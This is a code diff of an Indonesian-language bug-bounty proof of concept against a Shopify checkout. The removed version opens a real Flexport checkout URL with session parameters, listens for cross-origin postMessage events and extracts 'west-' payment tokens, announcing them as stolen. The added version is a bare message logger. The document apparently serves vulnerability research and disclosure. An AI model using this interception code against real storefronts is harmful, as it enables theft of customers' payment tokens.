@@ -1,77 +1,33 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Shopify postMessage Token Leakage Tester</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 30px; background-color: #f4f6f9; color: #333; }
-        .box { max-width: 800px; margin: 0 auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h1 { color: #d9534f; border-bottom: 2px solid #e9ecef; padding-bottom: 10px; }
-        button { background-color: #0275d8; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { background-color: #025aa5; }
-        .status { background-color: #d9534f; color: white; padding: 15px; border-radius: 5px; font-weight: bold; margin-top: 20px; display: none; }
-        pre { background: #222; color: #00ff00; padding: 15px; border-radius: 5px; overflow-x: auto; font-size: 14px; max-height: 400px; }
-    </style>
-</head>
-<body>
-
-<div class="box">
-    <h1>[PoC] Lintas-Asal (Cross-Origin) Payment Token Interception</h1>
-    <p>Situs ini mensimulasikan domain penyerang yang mengeksploitasi celah target origin wildcard (<code>*</code>) pada checkout Shopify.</p>
-    
-    <!-- Tombol untuk memicu pembukaan jendela target -->
-    <button onclick="bukaTarget()">1. Buka Halaman Checkout Target</button>
-    <p><em>Setelah halaman checkout terbuka di tab baru, silakan isi data kartu kredit sembarang untuk memicu pembuatan token.</em></p>
-
-    <div id="alertBocor" class="status">🚨 CRITICAL: TOKEN PEMBAYARAN "WEST-" BERHASIL DICURI PENYERANG!</div>
-
-    <h3>Data Intersepsi (Live Logs):</h3>
-    <pre id="logConsole">Menunggu data melintas...</pre>
-</div>
-
 <script>
-    const logConsole = document.getElementById("logConsole");
-    const alertBocor = document.getElementById("alertBocor");
-    let targetWindow = null;
+const logConsole = document.getElementById("logConsole");
 
-    function bukaTarget() {
-        // Membuka URL checkout target di tab baru
-        // Ganti URL ini dengan URL checkout Flexport yang valid jika token sesi di bawah sudah kedaluwarsa
-        const urlTarget = "https://shop.flexport.com/checkouts/cn/hWNDiWX0JK8WP3AseizxhoEU/en-id?_r=AQABC9qbdUROh9V9LlDs0jZFh6GUrcCnILJplo8wa_VbmoM&_su_rec=HW7-obz0wtTc59mbrxBMZwSuq0SlFh870OVmPeJ2EXbTu1UOUZQAI0XJTdtQDopnHYJ-vYey1fFzJ7DEKB5sDfvE9iwqK38pn5XHEUNldL6ipiIRVs1VmmiOZkeeUVlMERMgLIYPULJZslj2_zFDLV7Gz7cFbpPwGQMZ3N2e1wHSdAioMS1ehZII8WYY0UEqxcWyZa3xi8KawHoWtbGZhZI&auto_redirect=false&edge_redirect=true&skip_shop_pay=true";
-        targetWindow = window.open(urlTarget, "_blank");
-        logConsole.textContent = "[*] Jendela target berhasil dibuka. Menunggu interaksi formulir kartu...\n";
+function log(msg) {
+    console.log(msg);
+    logConsole.textContent += msg + "\n";
+}
+
+function bukaTarget() {
+    const urlTarget = "https://shop.flexport.com/";
+    const win = window.open(urlTarget, "_blank");
+
+    log("[+] Popup dibuka");
+    log("[+] Window object: " + !!win);
+}
+
+window.addEventListener("message", function(event) {
+    log("=================================");
+    log("MESSAGE RECEIVED");
+    log("ORIGIN: " + event.origin);
+
+    try {
+        log("DATA: " + JSON.stringify(event.data));
+    } catch(e) {
+        log("DATA: " + String(event.data));
     }
 
-    // Mendengarkan pesan dari jendela mana pun (termasuk popup/tab baru yang dibuka oleh skrip ini jika mereka mengirim balik)
-    window.addEventListener("message", function(event) {
-        let dataStr = "";
-
-        if (typeof event.data === "string") {
-            dataStr = event.data;
-        } else if (typeof event.data === "object" && event.data !== null) {
-            dataStr = JSON.stringify(event.data);
-        }
-
-        if (!dataStr || dataStr === "{}") return;
-
-        // Cetak log pesan ke layar PoC
-        if (logConsole.textContent.includes("Menunggu data")) {
-            logConsole.textContent = "";
-        }
-        logConsole.textContent += `[ORIGIN]: ${event.origin}\n[DATA]: ${dataStr}\n--------------------------------------------------\n`;
-        logConsole.scrollTop = logConsole.scrollHeight;
-
-        // Validasi utama: Apakah data mengandung token pembayaran sensitif Shopify?
-        if (dataStr.includes('"action":"token"') && dataStr.includes('"token":"west-')) {
-            alertBocor.style.display = "block";
-            
-            // Ekstrak token untuk ditampilkan di notifikasi alert browser
-            const matchToken = dataStr.match(/"token":"(west-[^"]+)"/);
-            const tokenValue = matchToken ? matchToken[1] : "west-unknown";
-            
-            alert(`[HackerOne Bug Bounty PoC]\n\nSukses Mencuri Token Pembayaran!\nToken: ${tokenValue}`);
-        }
-    }, false);
+    console.log(event);
+});
 </script>
-</body>
-</html>
+<button onclick="window.postMessage('TEST123','*')">
+Test Listener
+</button>
